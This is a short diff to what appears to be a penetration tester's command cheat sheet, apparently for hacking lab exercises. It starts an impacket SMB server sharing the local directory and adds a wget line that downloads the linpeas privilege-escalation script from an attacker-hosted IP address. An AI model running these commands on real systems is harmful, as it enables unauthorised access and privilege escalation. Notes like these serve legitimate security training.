@@ -12,3 +12,4 @@ Powershell Commands:
 Linux Commands:
   impacket-smbserver ghh `pwd` -smb2support &
                            start smbserver, call our share ghh, and map it to our local directory and run in background.
+  wget http://10.8.94.215:8000/linpeas.sh
